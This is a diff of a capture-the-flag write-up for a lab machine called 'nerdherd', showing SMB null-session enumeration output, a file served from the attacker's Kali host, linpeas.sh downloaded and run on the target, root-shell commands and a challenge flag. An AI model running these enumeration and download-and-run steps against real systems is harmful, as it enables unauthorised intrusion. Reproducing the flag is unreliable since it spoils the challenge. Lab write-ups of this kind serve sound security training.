@@ -297,12 +297,9 @@ Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-
  ============================( Enumerating Workgroup/Domain on 10.10.175.11 )============================
 
-
 [+] Got domain/workgroup name: WORKGROUP
-
 
  ================================( Nbtstat Information for 10.10.175.11 )================================
 
@@ -319,9 +316,7 @@ Looking up status of 10.10.175.11
 
  ===================================( Session Check on 10.10.175.11 )===================================
 
-
 [+] Server 10.10.175.11 allows sessions using username '', password ''
-
 
  ================================( Getting domain SID for 10.10.175.11 )================================
 
@@ -330,19 +325,15 @@ Domain Sid: (NULL SID)
 
 [+] Can't determine if host is part of domain or part of a workgroup
 
-
  ===================================( OS information on 10.10.175.11 )===================================
 
-
 [E] Can't get OS info with smbclient
-
 
 [+] Got OS info for 10.10.175.11 from srvinfo: 
 	NERDHERD       Wk Sv PrQ Unx NT SNT nerdherd server (Samba, Ubuntu)
 	platform_id     :	500
 	os version      :	6.1
 	server type     :	0x809a03
-
 
  =======================================( Users on 10.10.175.11 )=======================================
 
@@ -432,7 +423,6 @@ ftp localhost
 restart
 reboot
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python3 -m http.server 1234
 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
@@ -456,7 +446,6 @@ linpeas.sh                  100%[==========================================>] 80
 
 chuck@nerdherd:/tmp$ chmod +x linpeas.sh 
 chuck@nerdherd:/tmp$ ./linpeas.sh 
-
 
 ╔══════════╣ Operative system
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
@@ -556,7 +545,6 @@ root
 root.txt
 # cat root.txt	
 cmon, wouldnt it be too easy if i place the root flag here?
-
 
 # ls -lah
 total 40K
@@ -776,10 +764,7 @@ nOOt nOOt! you've found the real flag, congratz!
 
 THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
 
-
 ```
-
-![[Pasted image 20230502114136.png]]
 
 User Flag  
 
